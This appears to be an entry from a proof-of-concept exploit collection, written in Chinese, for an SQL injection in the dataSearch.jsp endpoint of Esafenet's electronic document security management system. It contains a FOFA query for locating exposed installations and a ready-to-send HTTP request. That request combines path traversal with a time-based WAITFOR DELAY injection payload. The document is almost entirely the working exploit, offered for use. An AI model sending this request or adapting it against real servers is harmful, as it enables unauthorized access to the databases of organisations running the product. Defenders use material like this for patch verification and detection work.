## 亿赛通电子文档安全管理系统接口dataSearch.jsp存在SQL注入

## fofa
```
app="亿赛通-电子文档安全管理系统"
```

## poc
```
POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Host: balalanengliang
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

id=1';WAITFOR+DELAY+'0:0:5'--
```
